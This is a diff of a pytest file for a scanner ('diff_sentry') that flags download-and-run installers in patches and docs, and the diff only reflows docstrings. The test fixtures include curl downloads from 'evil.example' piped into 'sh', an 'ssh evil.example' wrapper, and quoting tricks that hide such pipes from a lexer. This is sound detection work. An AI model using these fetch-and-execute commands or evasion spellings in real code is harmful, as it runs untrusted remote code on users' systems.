@@ -1,9 +1,6 @@
 """The line-wide floor under the shell lexer (`diff_sentry/linewide.py`): the rule the project had before the lexer, kept as it was.
 
-Three kinds of tests. The rows pin the module itself, each by the shortest input on which a mutant of it (a word dropped from a vocabulary, a pattern's alternative, class member,
-bound or anchor, a comparison, a count) answers differently from the code: `_REGEX_ROWS` are the spans a pattern finds, `_WRAPPED_ROWS` what `wrapped` says of a line, `_EDGE_ROWS` which
-characters `_edge` takes for markup. The tables after them pin `opening_lines` and `encloses`. The last tests are end to end: texts in which the quote that the consumer is handed is not a quote of
-the raw text (a literal, a scalar, a printf, a variable, a link, a code span), which the lexer reads as closed and the floor keeps `critical`, in a body, a README patch and an rst file."""
+Three kinds of tests. The rows pin the module itself, each by the shortest input on which a mutant of it (a word dropped from a vocabulary, a pattern's alternative, class member, bound or anchor, a comparison, a count) answers differently from the code: `_REGEX_ROWS` are the spans a pattern finds, `_WRAPPED_ROWS` what `wrapped` says of a line, `_EDGE_ROWS` which characters `_edge` takes for markup. The tables after them pin `opening_lines` and `encloses`. The last tests are end to end: texts in which the quote that the consumer is handed is not a quote of the raw text (a literal, a scalar, a printf, a variable, a link, a code span), which the lexer reads as closed and the floor keeps `critical`, in a body, a README patch and an rst file."""
 
 from __future__ import annotations
 
@@ -554,8 +551,7 @@ def _installer_severities(body: str, filename: str | None) -> list[str]:
 @pytest.mark.parametrize("filename", [None, "README.md", "docs/guide.rst"])
 @pytest.mark.parametrize("name", list(_SPELLINGS))
 def test_a_wrapper_line_whose_quote_the_consumer_is_handed_but_the_raw_text_does_not_spell_keeps_the_installer_critical(name, filename):
-    """The text decodes, renders or evaluates to `ssh evil.example '⏎<installer>⏎'`, which a real shell runs inside ssh's argument. The raw text has the wrapper word and a quote
-    character (or a here-document operator) on one line, which is all the floor asks."""
+    """The text decodes, renders or evaluates to `ssh evil.example '⏎<installer>⏎'`, which a real shell runs inside ssh's argument. The raw text has the wrapper word and a quote character (or a here-document operator) on one line, which is all the floor asks."""
     assert _installer_severities(_SPELLINGS[name].format(u=_UV), filename) == ["critical"], name
 
 
@@ -636,8 +632,7 @@ def test_a_name_glued_to_the_command_is_a_program_that_runs_it(before, expected)
 @pytest.mark.parametrize("name", ["bin/}x", "bin/]x", "bin/\U0001f600", "bin/\u00a9", "bin/\u2026", "bin/\u2014", "bin/\u2192", "bin/\u00a0x", "bin/\u2003x", "bin/\u3000x", "./\u00a0x"])
 @pytest.mark.parametrize("filename", [None, "README.md"])
 def test_a_program_by_a_path_in_front_of_the_command_keeps_the_installer_critical_whatever_its_name_holds(name, filename):
-    """The lead check of the softening reads a word with a slash as a program only when a name follows it; the earlier rule read the first word of a line with a slash as a program. A file
-    named `bin/}x` runs (the shell's blanks are a space, a tab and a newline) and its output goes to `sh`, so the floor asks the earlier rule of the text in front of the command."""
+    """The lead check of the softening reads a word with a slash as a program only when a name follows it; the earlier rule read the first word of a line with a slash as a program. A file named `bin/}x` runs (the shell's blanks are a space, a tab and a newline) and its output goes to `sh`, so the floor asks the earlier rule of the text in front of the command."""
     assert _installer_severities(f"{name} {_UV}", filename) == ["critical"], name
 
 
@@ -737,8 +732,7 @@ def test_a_row_the_join_appended_is_enclosed_when_either_reading_opens_or_enclos
     ("\\ No newline ssh evil.example &#39;", ["medium"]),
 ])
 def test_a_removed_line_a_hunk_header_and_a_no_newline_note_open_nothing_in_the_rendered_new_file(line, expected):
-    """The exceptions to the lower bound that the earlier rule's critical keeps: the rendered view of a patch is of the new file, so a removed line, a hunk header (but not the heading after its
-    second `@@`, which is a line of the new file) and a `\\ No newline` note open nothing in it. The planner tool reads its region as a patch. The entity is the quote only the rendered view spells."""
+    """The exceptions to the lower bound that the earlier rule's critical keeps: the rendered view of a patch is of the new file, so a removed line, a hunk header (but not the heading after its second `@@`, which is a line of the new file) and a `\\ No newline` note open nothing in it. The planner tool reads its region as a patch. The entity is the quote only the rendered view spells."""
     from diff_sentry.indicators import make_indicator_tool
     out = make_indicator_tool()(f"@@ -1,2 +1,2 @@\n{line}\n+{_UV}\n")
     assert sorted(set(re.findall(r"\[(\w+)\] curl-pipe-shell", out))) == expected, line
@@ -767,8 +761,7 @@ _NO_TAIL_PAIRING = "echo 'x\n|a)|\ny'\ncurl -H 'X: a\nb' https://evil.example/x 
 
 @pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
 def test_a_row_line_the_join_appends_never_hides_a_download_in_the_text_above(filename):
-    """The line appended for the row `|a)|` ends in a quote. Read as one text with the lines above, it paired with the `\\'` in the real `curl`'s argument and swallowed the pipe, so a download a shell
-    runs was found nowhere. The appended lines are read as a text of their own."""
+    """The line appended for the row `|a)|` ends in a quote. Read as one text with the lines above, it paired with the `\\'` in the real `curl`'s argument and swallowed the pipe, so a download a shell runs was found nowhere. The appended lines are read as a text of their own."""
     assert "critical" in _installer_severities(_NO_TAIL_PAIRING, filename), filename
     assert "critical" in _installer_severities(_NO_TAIL_PAIRING + f"\nInstall uv:\n\n{_UV}", filename), filename       # and a documented installer beside it does not soften it
 
@@ -793,8 +786,7 @@ def test_the_matches_of_a_pattern_in_the_text_and_in_the_appended_lines_are_foun
     (f"<details>\n``` <code>{_UV}</code>", "README.md"),
 ])
 def test_a_backtick_that_the_rendered_view_erases_still_keeps_the_installer_critical(text, filename):
-    """`<code> ' </code>` renders to a bare quote and a fence marker inside an HTML block is blanked, and both take the backtick away that makes a command in front of the installer not its own: the
-    view without those two readings is read as well, and the stricter hit stands."""
+    """`<code> ' </code>` renders to a bare quote and a fence marker inside an HTML block is blanked, and both take the backtick away that makes a command in front of the installer not its own: the view without those two readings is read as well, and the stricter hit stands."""
     assert "critical" in _installer_severities(text, filename), (text, filename)
 
 
@@ -840,8 +832,7 @@ _ESCAPED_QUOTE_ARGUMENTS = [
 @pytest.mark.parametrize("text", _ESCAPED_QUOTE_ARGUMENTS)
 @pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
 def test_a_download_whose_quoted_argument_runs_over_a_line_is_found_when_it_ends_in_an_escaped_quote(text, filename):
-    """A shell reads `\\'` outside a string as a quote character of the word, so the pipe after it is a pipe. The first window paired that quote with one on a later line and swallowed the pipe, and the
-    plain window cannot cross the newline of the quoted argument. Bash and dash run the stub `curl` and then `sh` on these texts."""
+    """A shell reads `\\'` outside a string as a quote character of the word, so the pipe after it is a pipe. The first window paired that quote with one on a later line and swallowed the pipe, and the plain window cannot cross the newline of the quoted argument. Bash and dash run the stub `curl` and then `sh` on these texts."""
     assert "critical" in _installer_severities(text, filename), (text, filename)
     assert "critical" in _installer_severities(f"Install uv:\n\n{_UV}\n\n{text}", filename), (text, filename)       # beside a documented installer it is not softened away
 
@@ -872,8 +863,7 @@ _QUOTED_PIPE_BEFORE_THE_URL = [
 @pytest.mark.parametrize("text", _QUOTED_PIPE_BEFORE_THE_URL)
 @pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
 def test_a_quoted_pipe_in_front_of_the_real_url_keeps_the_download_critical(text, filename):
-    """The quoted `|` is an argument (a placeholder and a pipe in one string); the real URL is the next argument and the shell fetches it. Two windows find the same span; the one the softening judges is the plain
-    window, which reads the quoted pipe as a stage that is no copy filter. Judging the capture of the escaped window instead read the placeholder only and softened the download."""
+    """The quoted `|` is an argument (a placeholder and a pipe in one string); the real URL is the next argument and the shell fetches it. Two windows find the same span; the one the softening judges is the plain window, which reads the quoted pipe as a stage that is no copy filter. Judging the capture of the escaped window instead read the placeholder only and softened the download."""
     assert "critical" in _installer_severities(text, filename), (text, filename)
 
 
@@ -890,8 +880,7 @@ _DOLLAR_QUOTE_ARGUMENTS = [
 @pytest.mark.parametrize("text", _DOLLAR_QUOTE_ARGUMENTS)
 @pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
 def test_a_dollar_that_starts_no_ansi_c_string_leaves_the_quote_after_it_a_plain_single_quoted_string(text, filename):
-    """After `\\$` and after `$$` (the PID) bash reads `'...'` as a single-quoted string, and dash reads every `$'` that way; the window that takes `$'...'` for an ANSI-C string (where `\\'` is an
-    escaped quote) swallows the next quote and the multi-line argument stays open. The window with `$` as a plain character finds them."""
+    """After `\\$` and after `$$` (the PID) bash reads `'...'` as a single-quoted string, and dash reads every `$'` that way; the window that takes `$'...'` for an ANSI-C string (where `\\'` is an escaped quote) swallows the next quote and the multi-line argument stays open. The window with `$` as a plain character finds them."""
     assert "critical" in _installer_severities(text, filename), (text, filename)
     assert "critical" in _installer_severities(f"Install uv:\n\n{_UV}\n\n{text}", filename), (text, filename)
     assert indicators._CURL_PIPE_DOLLAR_RE.search(text), text
@@ -911,8 +900,7 @@ _ESCAPED_PIPE_ARGUMENTS = [
 @pytest.mark.parametrize("text", _ESCAPED_PIPE_ARGUMENTS)
 @pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
 def test_an_escaped_pipe_or_dollar_among_the_arguments_of_a_multi_line_download_does_not_hide_the_pipe(text, filename):
-    """A shell reads `\\|` as an ordinary character of a word, so the pipe after it is the pipe. Bash and dash run the stub `curl` and then `sh` on these texts (the `$'` one under dash only). A single-line Markdown
-    table cell that spells its pipe `\\|` is found by the window that ignores quotes."""
+    """A shell reads `\\|` as an ordinary character of a word, so the pipe after it is the pipe. Bash and dash run the stub `curl` and then `sh` on these texts (the `$'` one under dash only). A single-line Markdown table cell that spells its pipe `\\|` is found by the window that ignores quotes."""
     assert "critical" in _installer_severities(text, filename), (text, filename)
     assert "critical" in _installer_severities(f"Install uv:\n\n{_UV}\n\n{text}", filename), (text, filename)
 
@@ -941,8 +929,7 @@ _EVEN_BACKSLASHES_BEFORE_THE_PIPE = [
 @pytest.mark.parametrize("text", _EVEN_BACKSLASHES_BEFORE_THE_PIPE)
 @pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
 def test_a_pipe_after_an_escaped_backslash_is_a_pipe_in_the_softening_too(text, filename):
-    """`\\\\` is a literal backslash argument and the `|` after it is the pipe. Turning every `\\|` into `|` made the pipe an escaped one, the multi-line download was not matched, and beside a documented
-    installer the softening judged only the installer."""
+    """`\\\\` is a literal backslash argument and the `|` after it is the pipe. Turning every `\\|` into `|` made the pipe an escaped one, the multi-line download was not matched, and beside a documented installer the softening judged only the installer."""
     assert "critical" in _installer_severities(text, filename), (text, filename)
     assert "critical" in _installer_severities(f"Install uv:\n\n{_UV}\n\n{text}", filename), (text, filename)
 
